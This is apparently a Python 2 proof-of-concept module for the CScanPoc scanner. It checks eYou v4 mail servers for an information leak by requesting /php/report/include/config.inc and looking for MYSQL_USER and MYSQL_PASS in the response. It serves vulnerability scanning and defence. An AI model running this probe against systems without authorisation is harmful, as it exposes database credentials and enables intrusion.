# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'eYou_0002'  # 平台漏洞编号，留空
    name = 'eYou v4 /php/report/include/config.inc 信息泄露'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-18'  # 漏洞公布时间
    desc = '''
    漏洞文件：/php/report/include/config.inc .
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://wooyun.org/bugs/wooyun-2014-058462
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'v4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09e58af3-af5c-481f-96d3-0cd1df299fed'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/php/report/include/config.inc'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if 'MYSQL_USER' in content and 'MYSQL_PASS' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
